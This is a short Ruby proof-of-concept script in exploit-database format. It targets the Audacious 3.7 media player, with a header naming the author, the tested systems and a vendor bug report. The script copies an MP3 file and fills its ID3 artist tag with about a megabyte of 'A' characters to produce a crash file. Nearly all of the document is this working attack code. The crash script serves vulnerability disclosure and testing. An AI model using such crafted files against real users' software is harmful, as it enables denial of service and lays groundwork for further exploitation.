# Exploit Title: Audacious 3.7 ID3 Local Crash PoC
# Date: 11-20-2015
# Exploit Author: Antonio Z.
# Vendor Homepage: http://audacious-media-player.org/
# Software Link: http://audacious-media-player.org/download | http://distfiles.audacious-media-player.org/audacious-3.7-win32.zip
# Version: 3.7
# Tested on: Windows 7 SP1 x64, Windows 8.1 x64, Windows 10 x64, Debian 8.2 x86-x64
# Comment: Issue was reported: http://redmine.audacious-media-player.org/issues/595

require 'fileutils'
require 'mp3info'

evil = 'A' * 1048576

FileUtils.cp 'Test_Case.mp3', 'Test_Case_PoC.mp3'

Mp3Info.open('Test_Case_PoC.mp3') do |mp3|
  mp3.tag.artist = evil
end